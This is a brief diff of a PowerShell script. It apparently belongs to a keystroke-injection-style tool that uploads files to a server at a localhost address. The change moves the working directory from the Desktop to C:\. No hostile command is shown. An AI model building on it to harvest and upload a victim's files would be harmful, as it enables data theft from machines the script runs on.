@@ -18,7 +18,8 @@ $APIKEY = 69420
 $SERVERSITE = "http://127.0.0.1:5001/upload"
 
 # Open Powershell
-cd "$HOME\Desktop"
+#cd "$HOME\Desktop"
+cd "C:\"
 
 # Disable capslock
 if ([console]::CapsLock -eq $true) {
